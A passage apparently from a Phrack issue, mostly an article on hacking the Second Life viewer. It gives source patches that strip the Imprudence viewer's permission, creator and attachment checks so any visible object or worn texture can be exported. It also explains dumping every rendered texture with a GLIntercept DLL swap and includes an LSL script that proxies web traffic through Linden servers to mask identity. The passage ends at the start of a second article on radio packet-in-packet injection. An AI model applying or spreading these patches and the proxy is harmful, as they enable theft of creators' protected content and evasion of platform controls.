+M(]8VX)!9H:]6/X70]S%\O8SFY%%^`%]*MV+78ONU6T%7(_V,J=7CNC`0')9#
+M#^QI2F%,Z%8ROU>C@^LB@EM%`>F/I7;4!/2,(--J!(M$>"#))(V!KT3;0'V]
+M`^-W>@SVIG'&U@7#[`A/;6!-Q-V\#,O=H.!*$OJT)@FR+DGD%_353%L'CP"R
+M_XW4C'\QQO;U_SH?NJ[^WXM`=?U-+^ISC;'!_]/9.^A4UK_;/N@Z_\]+0!19
+MCG,SUB$#;F4=/VCZ!.\-]=K&?;.2^E63WX4D![\]H4O,V3#%:Z0Q*^NX@6%R
+MG%/\;O'IKH^&*=Z.Y?X-ZH-^T-.B%[0TCBBR>+?'LB/"%`J='OYO-F&4!K['
+MCGU0*%"EQS87V2!4O\$P/<]K9&,N8R>+C\4=5V\EM8A(T8MA%@,/:,F`X@OZ
+M9?1C3S1?W\A\%.&9/ACO(PX#!!)!%)TIC[PN8G6(P0-2YT2Z%,6!+JDB"*$1
+MV2>`)32HV(K!U`T#_+OP+,R^/UZC7+%B.4T>CQ2-3$3JB0E]2^7M''((T(JQ
+M\ZOLVJAFLM\RM'EJ-LN7TX(IR[6R]ONX]B5-U?4O7U06'4WBG;V>G)PD#N,0
+M,S@C&<9XU!:6M22))V/&N?H]5)$'-28J4&T6L/M[QM5VIP(S/@.3N@%:5XC]
+MQG.\\)#/A`$;3N;I.*9#TO2323BYF?J"*K3AMNCU#N\AJ&%['LP)F4V*\0UE
+MNH^%0:6VN7"2R#IJNM;9<)(.KT)]D*NGHB5:`&MKCB`[DOTKBP"G"_N&8!>D
+MMU_AJ&$C3.#`O."=MCI><TVNL?$\XQ5=DH3)O?:7]VU`5?[;T>_G&6.3_.]V
+MNE7Y#\]._K\$@'BVE_SA?)(WK`]@B%[J`V(VRA/`\0WYO.BA/=!2Y'_[4)^D
+M2IH;;BZ=R2-3'$1<'V\',#Z:I0N\2985PWPY2E6`*-`LKS"S3,EN&7@,/<SR
+MOX!T)#<W2'6NK@(@V;KD6I/YD>&<5'J9<([/%G8W/6"+^6:O%DNIJ*?M6`P"
+M8@OPY<<<]B[H$K!\:H8HI$!S`MX!)>B9BZ)S]$9=JC*=7&PK<A8%E`M(3-2,
+MT3020:(Y^JP-;M`(J.#0WH#)QC@/;(3S+)M1Q"_&NDWLY^>S4_A/E30R^!'.
+MKM."^T@$3)C&1!&G=C,U@?DK#Y-PROM]PZV/^3@;G=[F$JS!)XZ`WY)3E$=B
+M8]]"9+(A)53768QF=BI&7*`4JV>S&S>2O=]NI_FIY-XRSR4OC!\?9*EL([C*
+M_)/CDJNBA$*E&1%&8Z@W4I=0#50JSG?04)QJX<"!`P<.'#APX,"!`P<.'#AP
+2X,"!`P<.7A_^`BMJX<X`>```
+`
+end
+
+
+|=[ 0x05 ]=---=[ Hacking the Second Life Viewer For Fun & Profit - Eva ]-=|
+
+|=-----------------------------------------------------------------------=|
+|=------------------------=[ 01110010011000010110 ]=---------------------=|
+|=------------------------=[ 01100110010101101110 ]=---------------------=|
+|=------------------------=[ 10010110111001110011 ]=---------------------=|
+|=------------------------=[ 01110011011001010111 ]=---------------------=|
+|=-----------------------------------------------------------------------=|
+
+Index
+
+------[ N. Preamble
+------[ I. Part I - Objects
+------[ II. Part II - Textures
+            II. i. Textures - GLIntercept
+------[ III. Postamble
+------[ B. Bibliography
+------[ A. Appendix
+
+|=-----------------------------------------------------------------------=|
+
+------[ N. Preamble
+
+Second Life [1] is a virtual universe created by Linden Labs [2] which
+allows custom content to be created by uploading different file formats. It
+secures that content with a permission mask "Modify / Copy / Transfer",
+which allows creators to protect their objects from being modified, copied
+or transferred from avatar to avatar. The standard viewer at the time of
+this writing is 2.x but the 1.x old codebase is still around and it is
+still the most wide-spread one. Then, we have third party viewers, and
+those are viewers forked off the 1.x codebase and then "extended" to modify
+the UI and add features for convenience.
+
+Second Life works on the principle of separately isolated servers called
+SIMs (from, simulator, now recently renamed to "Regions") which are
+interconnected to form grids. The reasoning is that, if one SIM goes down,
+it will become unavailable but it will not take down the entire grid. A
+grid is just a collection of individual SIMs (regions) bunched together.
+
+Avatars are players that connect to the grid using a viewer and navigate
+the SIMs by "teleporting" from one SIM to the other. Technically, that
+just means that the viewer is instructed to connect to the address of a
+different SIM.
+
+A viewer is really just a Linden version of a web browser (literally) which
+relies on loads of Open Source software to run. It renders the textures
+around you by transferring them from an asset server. The asset server is
+just a container that stores all the content users upload onto Second Life.
+Whenever you connect to a SIM, all the content around you gets transferred
+to your viewer, just like surfing a website.
+
+There are a few content types in Second Life that can be uploaded by users:
+
+  1.) Images
+  2.) Sounds
+  3.) Animations
+
+Whenever I talk about "textures", I am talking about the images that users
+have uploaded onto Second Life. In order to upload one of them onto Second
+Life, you have to pay 10 Linden dollars. Linden maintains a currency
+exchange from Linden dollars to real dollars.
+
+At any point, depending on the build permission of the SIM you are
+currently on, you are able to create objects. Those are just basic
+geometric shapes called primitives, (or prims for short) such as cubes,
+spheres, prisms, etc... After you created a primitive, you can decorate
+it with images or use the Linden Scripting Language LSL [3] to trigger
+the sounds you uploaded or animate avatars like yourself. There is a lot
+to say about LSL, but it exceeds the scope of the article. You can also
+link several such primitives together to form a link set which, in turn,
+is called an object. (LISP fans dig in, Second Life is all about lists -
+everything is a list.)
+
+Coming back to avatars, your avatar has so called attachment-points which
+allow you to attach such an object to yourself. Users create content, such
+as hats, skirts, and so on and they sell them to you and you attach them to
+these attachment points.
+
+In addition to that, there are such things called wearables. Those are
+different from attachments because they are not made up of objects but they
+are rather simple textures that you apply to yourself. Those do not have
+any geometric properties in-world and function on the principle of layers,
+hiding the layer underneath. Finally, you have body parts which are also
+just textures. For example, eyes, your skin.
+
+The wearable layers get superimposed (baked) on you. For example, if you
+wear a skin and a T-shirt, the T-shirt texture will hide part of the skin
+texture underneath it.
+
+We are going to take a standard viewer: we will use the Imprudence [4]
+viewer, the current git version of which has such an export feature and we
+are going to modify it so it will allow exports of any in-world object.
+Later on, the usage of GLIntercept [7] will be mentioned since it can be
+used to export the wearables and the body parts mentioned which are just
+textures.
+
+Why does this work? There are a number of restrictions which are enforced
+by the server, and a number of actions that the server cannot control. For
+example, every action you trigger in Second Life usually gets a permission
+check with the SIM you are triggering the action on. Your viewer interprets
+the response from the SIM and if it is given the green light, your viewer
+goes ahead and performs the action you requested.
+
+Say, for example, that the viewer does not care whether the SIM approves it
+or not and just goes ahead and does it anyway. Will that work? It depends
+whether the SIM checks again. Some viewers have a feature called "Enable
+always fly.", which allows you to fly around in no-fly zones which is an
+instance of the problem. The SIM hints the viewer that it is a no-fly zone,
+however the viewer ignores it and allows you to fly regardless.
+
+Every avatar is independent in this aspect and protected from other avatars
+by a liability dumping prompt. Whenever an avatar wants to interact with
+you, you are prompted to allow them permission to do so. However, the
+graphics are always displayed and your viewer renders other avatars without
+any checks. One annoyance, for example, is to spam particles generated by
+LSL. Given a sufficiently slow computer, your viewer will end up
+overwhelmed and crash eventually. These days, good luck with that...
+
+But how do we export stuff we do not own, doesn't the server check for
+permissions? Not really, we are not going to "take" the object in the sense
+of violating the Second Life permissions. We are going to scan the object
+and note down all the parameters that the viewer can see. We are then going
+to store that in an XML file along with the textures as well. This will be
+done automatically using Imprudence's "Export..." feature.
+
+Whenever you upload any of the content types mentioned in the previous
+chapter, the Linden asset server generates an asset ID which is basically
+an UUID that references the content you uploaded. The asset server
+(conveniently for us) does not carry out any checks to see whether there is
+a link between an object referencing that UUID and the original uploader.
+Spelled out, if you manage to grab the UUID of an asset, you can reference
+it from an object you create.
+
+For example, if a user has uploaded a texture and I manage to grab the UUID
+of the texture generated by the asset server, then I can use LSL to display
+it on the surface of a primitive. It is basically just security through
+obscurity (and bugs)...
+
+------[ I. Part I - Objects
+
+The "Export..." feature on the viewers we attack is not an official feature
+but rather a feature implemented by the developers of the viewers
+themselves. That generally means that the viewer only implements certain
+checks at the client level without them being enforced by the server. The
+"Export..." feature is just a dumb feature which scans the object's
+measurements, grabs the textures and dumps the data to an XML file and
+stores image files separately.
+
+Since it is a client-side check, we can go ahead and download Imprudence
+(the same approach would work on the Phoenix [5] client too) and knock out
+all these viewer checks.
+
+After you cloned the Imprudence viewer from the git repo, the first file we
+edit is at linden/indra/newview/primbackup.cpp.
+
+Along the very fist lines there is a routine that sets the default
+textures, I do not think this is needed to make our "Export..." work, but
+it is a good introduction to what is going on in this article:
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+void setDefaultTextures()
+{
+    if (!gHippoGridManager->getConnectedGrid()->isSecondLife())
+    {
+        // When not in SL (no texture perm check needed), we can
+        // get these defaults from the user settings...
+        LL_TEXTURE_PLYWOOD =
+            LLUUID(gSavedSettings.getString("DefaultObjectTexture"));
+        LL_TEXTURE_BLANK =
+            LLUUID(gSavedSettings.getString("UIImgWhiteUUID"));
+        if (gSavedSettings.controlExists("UIImgInvisibleUUID"))
+        {
+            // This control only exists in the
+            // AllowInvisibleTextureInPicker patch
+            LL_TEXTURE_INVISIBLE =
+                LLUUID(gSavedSettings.getString("UIImgInvisibleUUID"));
+        }
+    }
+}
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+The viewer uses a method isSecondLife() to check if it is currently on the
+official grid. Depending on the outcome of this method, the viewer
+internally takes decisions on whether certain things are allowed so that
+the viewer will conform to the Linden third-party viewer (TPV) policy [6].
+The TPV policy is a set of rules that the creator of a viewer has to
+respect so that the viewer will be granted access to the Second Life grid
+(ye shall not steal, ye shall not spam, etc...).
+
+However, these checks are client-side only. They are used internally within
+the viewer and they have nothing to do with the Linden servers. What we do,
+is knock them out so that the viewer does not perform the check to see if
+it is on the official grid. In this particular case, we can knock out the
+check easily by eliminating the if-clause, like so:
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+void setDefaultTextures()
+{
+    //if (!gHippoGridManager->getConnectedGrid()->isSecondLife())
+    //{
+          // When not in SL (no texture perm check needed), we can
+          // get these defaults from the user settings...
+          LL_TEXTURE_PLYWOOD =
+              LLUUID(gSavedSettings.getString("DefaultObjectTexture"));
+          LL_TEXTURE_BLANK =
+              LLUUID(gSavedSettings.getString("UIImgWhiteUUID"));
+          if (gSavedSettings.controlExists("UIImgInvisibleUUID"))
+          {
+              // This control only exists in the
+              // AllowInvisibleTextureInPicker patch
+              LL_TEXTURE_INVISIBLE =
+                  LLUUID(gSavedSettings.getString("UIImgInvisibleUUID"));
+          }
+    //}
+}
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+Without this check, the viewer assumes that we are on any grid but the
+Second Life grid. You probably can notice that these checks are completely
+boilerplate.
+
+Let us move on to the next stop. Somewhere in
+linden/indra/newview/primbackup.cpp you will find the following:
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+bool PrimBackup::validatePerms(const LLPermissions *item_permissions)
+{
+    if(gHippoGridManager->getConnectedGrid()->isSecondLife())
+    {
+        // In Second Life, you must be the creator to be permitted to
+        // export the asset.
+        return (gAgent.getID() == item_permissions->getOwner() &&
+            gAgent.getID() == item_permissions->getCreator() &&
+            (PERM_ITEM_UNRESTRICTED & item_permissions->getMaskOwner())
+            == PERM_ITEM_UNRESTRICTED);
+    }
+    else
+    {
+        // Out of Second Life, simply check that you're the owner and the
+        // asset is full perms.
+        return (gAgent.getID() == item_permissions->getOwner() &&
+            (item_permissions->getMaskOwner() & PERM_ITEM_UNRESTRICTED)
+            == PERM_ITEM_UNRESTRICTED);
+    }
+}
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+This checks to see if you have full permissions, and are the owner and the
+creator of the object you want to export. This only applies to the Second
+Life grid. If you are not on the Second Life grid, then it checks to see if
+you are the owner and have full permissions. We will not bother and will
+modify it to always return that all our permissions are in order:
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+bool PrimBackup::validatePerms(const LLPermissions *item_permissions)
+{
+    return true;
+}
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+The next stop is in the same file, at the following method:
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+LLUUID PrimBackup::validateTextureID(LLUUID asset_id)
+{
+    if (!gHippoGridManager->getConnectedGrid()->isSecondLife())
+    {
+        // If we are not in Second Life, don't bother
+        return asset_id;
+    }
+
+    LLUUID texture = LL_TEXTURE_PLYWOOD;
+    if (asset_id == texture ||
+            asset_id == LL_TEXTURE_BLANK ||
+            asset_id == LL_TEXTURE_INVISIBLE ||
+            asset_id == LL_TEXTURE_TRANSPARENT ||
+            asset_id == LL_TEXTURE_MEDIA)
+    {
+        // Allow to export a grid's default textures
+        return asset_id;
+    }
+    LLViewerInventoryCategory::cat_array_t cats;
+
+// yadda, yadda, yadda, blah, blah, blah...
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+There is a complete explanation of what this does in the comments. This
+checks to see whether you are in Second Life, and if you are, it goes
+through a series of inefficient and poorly coded checks to ensure that you
+are indeed the creator of the texture by testing whether the texture is in
+your inventory. We eliminate those checks and make it return the asset ID
+directly:
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+LLUUID PrimBackup::validateTextureID(LLUUID asset_id)
+{
+    return asset_id;
+}
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+Once you compile the modified viewer, you will be able to export any
+object, along with its textures that you can see in-world. The next step is
+to modify the skin (i.e. Imprudence's user interface) so that you may 
+export attachments from the GUI.
+
+First, let us enable the pie "Export..." button. I will assume that you use
+the default skin. The next stop is at
+linden/indra/newview/skins/default/xui/en-us/menu_pie_attachment.xml. You
+will need to add:
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+    <menu_item_call enabled="true" label="Export" mouse_opaque="true"
+        name="Object Export">
+        <on_click function="Object.Export" />
+        <on_enable function="Object.EnableExport" />
+    </menu_item_call>
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+Now, we need to enable it for any avatar at
+linden/indra/newview/skins/default/xui/en-us/menu_pie_avatar.xml. You will
+need to add:
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+    <menu_item_call enabled="true" label="Export" mouse_opaque="true"
+        name="Object Export">
+        <on_click function="Object.Export" />
+        <on_enable function="Object.EnableExport" />
+    </menu_item_call>
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+After that, we must add them so the viewer picks up the skin options. We
+open up linden/indra/newview/llviewermenu.cpp and add in the avatar pie
+menu section:
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+// Avatar pie menu
+...
+    addMenu(new LLObjectExport(), "Avatar.Export");
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+We do the same for the attachments section:
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+// Attachment pie menu
+...
+
+    addMenu(new LLObjectEnableExport(), "Attachment.EnableExport");
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+Now we are set. However, the viewer performs a check in "EnableExport" in
+linden/indra/newview/llviewermenu.cpp which we need to knock out:
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+class LLObjectEnableExport : public view_listener_t
+{
+    bool handleEvent(LLPointer<LLEvent> event, const LLSD& userdata)
+    {
+        LLControlVariable* control =
+            gMenuHolder->findControl(userdata["control"].asString());
+
+        LLViewerObject* object =
+        LLSelectMgr::getInstance()->getSelection()->getPrimaryObject();
+
+        if((object != NULL) &&
+            (find_avatar_from_object(object) == NULL))
+        {
+
+// yadda, yadda, yadda, blah, blah, blah...
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+The code initially checks whether the object exists, if it is not worn by
+an avatar, and then applies permission validations to all the children
+(links) of the object. If the object exists, if it is not worn by an avatar
+and all the permissions for all child objects are correct, then the viewer
+enables the "Export..." control. Since we do not care either way, we enable
+the control regardless of any checks.
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+class LLObjectEnableExport : public view_listener_t
+{
+    bool handleEvent(LLPointer<LLEvent> event, const LLSD& userdata)
+    {
+        LLControlVariable* control =
+            gMenuHolder->findControl(userdata["control"].asString());
+
+        LLViewerObject* object =
+        LLSelectMgr::getInstance()->getSelection()->getPrimaryObject();
+
+        if(object != NULL)
+        {
+            control->setValue(true);
+            return true;
+
+// yadda, yadda, yadda, blah, blah, blah...
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+I have left the NULL check for the object since if you happen to mis-click
+and select something other than an object, then the "Export..." pie menu
+will be enabled and your viewer will crash. More precisely, if you instruct
+the viewer to export something using the object export feature, and it is
+not an object, the viewer will crash since there are no checks performed
+after this step.
+
+Further on in linden/indra/newview/llviewermenu.cpp there is another test
+to see whether the object you want to export is attached to an avatar. In
+that case, the viewer considers it an attachment and disallows exporting.
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+class LLObjectExport : public view_listener_t
+{
+    bool handleEvent(LLPointer<LLEvent> event, const LLSD& userdata)
+    {
+        LLViewerObject* object =
+        LLSelectMgr::getInstance()->getSelection()->getPrimaryObject();
+        if (!object) return true;
+
+        LLVOAvatar* avatar = find_avatar_from_object(object);
+
+        if (!avatar)
+        {
+            PrimBackup::getInstance()->exportObject();
+        }
+
+        return true;
+    }
+};
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+Again, we proceed the same way and knock out that check which will allow
+us to export objects worn by any avatar:
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+class LLObjectExport : public view_listener_t
+{
+    bool handleEvent(LLPointer<LLEvent> event, const LLSD& userdata)
+    {
+        PrimBackup::getInstance()->exportObject();
+
+        return true;
+    }
+};
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+These changes will be sufficient in order to transform your viewer into an
+undetectable tool that will allow you to export any object along with the
+associated textures.
+
+There are indeed easier ways, for example toggling God mode from the
+source code and bypassing most checks. However, that will be discussed
+in the upcoming full article, along with explanations on what Linden are
+able to detect and wearable exports.
+
+Alternatively, and getting closer to a "bot", there are ways to program
+a fully non-interactive client [11] that will export everything it sees
+automatically. This will also be covered in the upcoming article since it
+takes a little more than hacks. The principle still holds: "who controls
+an asset UUID, has at least permission to grab the asset off the asset
+server".
+
+------[ II. Part II - Textures
+
+In the first part we have talked about exporting objects. There is more fun
+you can have with the viewer too, for example, grabbing any texture UUID,
+or dumping your skin and clothes textures.
+
+What can we do about clothes? If you have an outfit you would like to grab,
+with the previous method you will only be able to export primitives without
+the wearable clothes. How about backing up your skin?
+
+The 1.x branch of the Linden viewer has an option, disabled by default and
+only accessible to grid Gods, which will allow you to grab baked textures.
+Grid Gods are essentially Game Masters and in the case of Second Life, they
+consist of the "Linden"s, which are Linden Labs employees represented
+in-world by avatars, conventionally having "Linden" as their avatar's last
+name.
+
+We open up linden/indra/newview/llvoavatar.cpp and we find:
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+BOOL LLVOAvatar::canGrabLocalTexture(ETextureIndex index)
+{
+    // Check if the texture hasn't been baked yet.
+    if (!isTextureDefined(index))
+    {
+        lldebugs << "getTEImage( " << (U32) index << " )->getID()
+            == IMG_DEFAULT_AVATAR" << llendl;
+        return FALSE;
+    }
+
+    if (gAgent.isGodlike() && !gAgent.getAdminOverride())
+        return TRUE;
+
+// yadda, yadda, yadda, blah, blah, blah...
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+Aha, so it seems that grid Gods are permitted to grab textures. That is
+fine, so can we:
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+BOOL LLVOAvatar::canGrabLocalTexture(ETextureIndex index)
+{
+    // Check if the texture hasn't been baked yet.
+    if (!isTextureDefined(index))
+    {
+        lldebugs << "getTEImage( " << (U32) index << " )->getID()
+            == IMG_DEFAULT_AVATAR" << llendl;
+        return FALSE;
+    }
+
+    return TRUE;
+
+    if (gAgent.isGodlike() && !gAgent.getAdminOverride())
+        return TRUE;
+
+// yadda, yadda, yadda, blah, blah, blah...
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+But that is not sufficient. The 1.x viewer code has an error (perhaps
+intentional) which will crash the viewer when you try to grab the lower
+part of your avatar. In the original code at
+linden/indra/newview/llviewermenu.cpp, we have:
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+        else if ("lower" == texture_type)
+        {
+            handle_grab_texture( (void*)TEX_SKIRT_BAKED );
+        }
+        else if ("skirt" == texture_type)
+        {
+            handle_grab_texture( (void*)TEX_SKIRT_BAKED );
+        }
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+Which must be changed to:
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+        else if ("lower" == texture_type)
+        {
+            handle_grab_texture( (void*)TEX_LOWER_BAKED );
+        }
+        else if ("skirt" == texture_type)
+        {
+            handle_grab_texture( (void*)TEX_SKIRT_BAKED );
+        }
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+You are free to recompile and go to the menu and dump the textures on you,
+including your skin. To grab your skin, you can undress your avatar and
+grab the textures. You can then export them using the method from Part I.
+For clothes, you would do the same by clothing your avatar, grabbing the
+relevant textures and then exporting them using the method from Part I.
+
+You might notice that the texture that will be dumped to your inventory is
+temporary. That is, it is not an asset and registered with the asset
+server. Make sure you save the texture, or, if you want to save a bunch of
+them, consider reading the first part of the article and place the textures
+on a primitive and export the entire primitive.
+
+Since the textures are baked, they represent an overlay of your skin and
+your clothes. If you want to extract just the clothes, you might need to
+edit the grabbed textures in a graphics editing program to cut out the skin
+parts. However, it might be possible to use a transparent texture for your
+skin when you grab the textures. In that case, you will not have to edit
+the clothes at all.
+
+------[ II. Part II - Textures
+            II. i. Textures - GLIntercept
+
+The GLIntercept method involves grabbing a copy of GLIntercept and
+replacing the .dll file with the GLIntercept one. By doing that, when you
+run the Second Life viewer, all the textures will be stored to your hard
+drive in the images directory. It is a resource consuming procedure because
+any texture that your viewer sees is saved to your hard-drive.
+
+Therefore, if your only interest is to allot a collection of textures, then
+get GLIntercept and, after installing it, replace the opengl .dll from your
+viewer directory with the one from GLIntercept. If you cannot find the
+viewer's opengl .dll, then just copy it as a new file because the viewer
+will pick it up. I recommend setting your graphics all the way to low and
+taking it easy because in the background, the GLIntercept .dll will create
+an images directory and dump all the possible textures, including the
+textures belonging to the UI.
+
+There is a lot of fuss going on about GLIntercept. Some strange people say
+it does not work anymore and some funny people come up with ideas like
+encrypting the textures. The principle that GLIntercept works on is trivial
+to the point of making the whole fuss meaningless. GLIntercept, when used
+in conjunction with the viewer is an extra layer between your viewer and
+opengl. Anything that your graphics card renders can be grabbed - together
+with other similar software [8], the same effect described in this article,
+however it would require you to convert the structures to the Second Life
+format. The usage of GLIntercept is not restricted to Second Life, you can
+go ahead and grab anything you like from any program that uses opengl. It
+literally puts a dent (crater?) into content stealing, the important phrase
+being: "anything that your graphics card renders, can be grabbed".
+
+------[ IV. Postamble
+
+Second Life is a vanity driven virtual universe which is plagued by the
+most horrible muppets that fake anonymity could spawn. The Lindens maintain
+full control and all the content you upload automatically switches
+ownership to Linden Labs via the Terms of Service which make you renounce
+your copyright. Not only that, but there are plenty of rumours you are
+tracked and they have a dodgy "age-verification" system in place which
+forces you to send your ID card to be checked by "a third party". Under
+these circumstances, it is of course questionable what they do with that
+data and whether they link your in-world activities to your identity.
+
+There is more that could be potentially done, the viewers are so frail and
+incredibly poorly coded from all perspectives and certainly not the quality
+you would expect from an institution that makes billions of shineys. There
+have been exploits before such as Charlie Miller's Quicktime exploit [9]
+which was able to gain full control of your machine (patched now) and
+Michael Thumann's excellent presentation which goes over many concepts of
+Second Life as well as how they can be abused [10].
+
+One of the further possibilities I have been looking into (closely related
+to Michael Thumann's presentation) is to use LSL and create an in-world
+proxy that will enable your browser to connect to a primitive in-world and
+bounce your traffic. There is a limitation imposed on the amount of
+information an LSL script can retrieve off the web, however I am still
+looking into way to circumvent that. Essentially the idea would be to use
+the Linden Labs servers as a proxy to carry out all the surfing. At the
+current time of writing this article, I do have a working LSL
+implementation (you can see an example of that in [A. 1]) that can grab 2kb
+off any website (this is a limitation imposed by the LSL function
+llHTTPRequest()). Additionally, a PHP page could be created that rewrites
+the content sent back by the LSL script and so that the links send the
+requests back through the script in Second Life.
+
+Not only IPs, but headers, timezone, DNS requests and everything else gets
+spoofed that way.
+
+The possibilities are limitless and I have seen viewers emerge that rely on
+this concept, such as CryoLife or NeilLife. However, the identification
+strings sent by the few versions lying around the net have been tagged and
+any user connecting with them would be banned. If you want to amuse
+yourself further, you may want to have a look at:
+
+http://wiki.secondlife.com/wiki/User:Crone_Dryke
+
+Dedicated to CV. Many thanks to the Phrack Staff for their help and their
+interest in the article.
+
+Thank you for your time!
+
+------[ B. Bibliography
+
+[1] The Second Life website,
+    http://secondlife.com/
+[2] Linden Labs official website,
+    http://lindenlab.com/
+[3] Linden Scripting Language LSL Wiki,
+    http://wiki.secondlife.com/wiki/LSL_Portal
+[4] Imprudence Viewer downloads,
+    http://wiki.kokuaviewer.org/wiki/Imprudence:Downloads
+[5] The Phoenix Viewer,
+    http://www.phoenixviewer.com/
+[6] The third-party viewer policy,
+    http://secondlife.com/corporate/tpv.php
+[7] GLIntercept,
+    http://oreilly.com/pub/h/5235
+[8] Ogre exporters,
+    http://www.ogre3d.org/tikiwiki/OGRE+Exporters
+[9] QuickTime exploit granting full access to a users machine,
+    http://securityevaluators.com/content/case-studies/sl/
+[10] Thumann's presentation on possibilities how to exploit Second Life,
+     https://www.blackhat.com/presentations/bh-europe-08/Thumann/
+     Presentation/bh-eu-08-thumann.pdf
+[11] OpenMetaverse Library for Developers,
+     http://lib.openmetaverse.org/wiki/Main_Page
+
+------[ A. Appendix
+
+[A. 1] LSL script which requests an publicly accessible URL from the
+current SIM it is located on, and answers any proxies HTTP requests by
+accessing the public URL, suffixed with "/url=<some URL>" where "some URL"
+represents a web address. The script fetches 2k of the content and then
+sends it back to the browser.
+
+key uReq;
+key sReq;
+
+default
+{
+    state_entry()
+    {
+        llRequestURL();
+    }
+
+    changed(integer change)
+    {
+        if (change & CHANGED_INVENTORY) llResetScript();
+    }
+
+    http_request(key id, string method, string body)
+    {
+        if (method == URL_REQUEST_GRANTED) {
+            llOwnerSay(body);
+            return;
+        }
+        if (method == "GET") {
+            uReq = id;
+            list pURL = llParseString2List(
+                llGetHTTPHeader(id, "x-query-string"), ["="], []);
+            if (llList2String(pURL, 0) == "url")
+                sReq = llHTTPRequest(llList2String(pURL, 1),
+                    [HTTP_METHOD, "GET"], "");
+        }
+    }
+    http_response(key request_id,
+        integer status,
+        list metadata,
+        string body)
+    {
+        if (sReq == request_id) llHTTPResponse(uReq, 200, body);
+    }
+}
+
+
+|=[ 0x06 ]=---=[ How I misunderstood digital radio; or,
+                 "Weird machines" are in radio, too! - M.Laphroaig
+                                                       pastor@phrack ]--=|
+
+                          ...there be bytes in the air
+                             and Turing machines everywhere
+
+When one lays claim to generalizing a class of common misconceptions,
+it is fitting to start with one's own.  These are the things I used to
+believe about digital radio -- or, more precisely, would not have
+questioned if explicitly presented with them.
+
+=== Wishful thinking ===
+
+The following statements are obviously related and mutually
+reinforcing:
+
+1. Layer 1 delivers frames to Layer 2 either fully intact frames
+   exactly as transmitted by a peer in their entirety, or slightly
+   corrupted versions of such frames if CRC checking in Layer 1 is
+   disabled, as it sometimes is for sniffing.
+
+2. In order to be received at Layer 1, a frame must be transmitted
+   with proper encapsulation by a compatible Layer 1 transmitter using
+   the exact same PHY protocol. There is no substitution in commodity
+   PHY implementations for the radio chip circuitry activated when the
+   chip starts transmitting a queued Layer 2 frame, except by use of
+   an expensive software defined radio.
+
+3. Layer 1 implementations have means to unambiguously distinguish
+   between the radio transmission that precedes a frame -- such as the
+   frame's preamble -- and the frame's actual data. One cannot be
+   mistaken for another, or such a mistake would be extremely rare and
+   barely reproducible.
+
+4. Should a receiver miss the physical beginning of a frame
+   transmission on the air due to noise or a timing problem, the rest
+   of the transmission is wasted, and no valid frame could be received
+   at least until this frame's transmission is over.
+
+For Layer 1 injection, this would imply the following limitations:
+
+a. In order to successfully "inject" a crafted Layer 1 frame (that is,
+   to have it received by the target) the attacker needs to (1) build
+   the binary representation of the full frame in a buffer, (2)
+   possess a radio capable of transmitting buffer binary contents, and
+   (3) instruct the radio to transmit the buffer, possibly bypassing
+   hardware or firmware implementations of protocol features that may
+   alter or side-effect the transmission.
+
+b. In particular, the injecting radio must perfectly cooperate by
+   producing the proper encapsulating physical signals for the
+   preamble, etc., around the injected buffer-held frame. Without such
+   cooperation, injection is not possible.
+
+c. Errors due to radio noise can only break injection.  The injecting
+   transmission, as a rule, needs to be more powerful to avoid being
+   thwarted by ambient noise.
+
+d. Faraday cages are the ultimate protection against injection, as
+   long as the nodes therein maintain their software and hardware
+   integrity, and do not afford any undue privileges to the attacker.
+
+A high-level summary of these beliefs could be stated like
+this: the OSI Layer 1/Layer 2 boundary in digital radio is a _validity
+and authenticity filter_ for frames. In order to be received, a frame
+must be transmitted in its entirety via an "authentic" mechanism, the
+transmitting chip's logic going through its normal or nearly normal
+state transitions, or emulated by a software-defined radio.
+
+Each and every one of these is _false_, as demonstrated by the
+existence of Packet-in-Packet (PIP) [1,2] exploits.
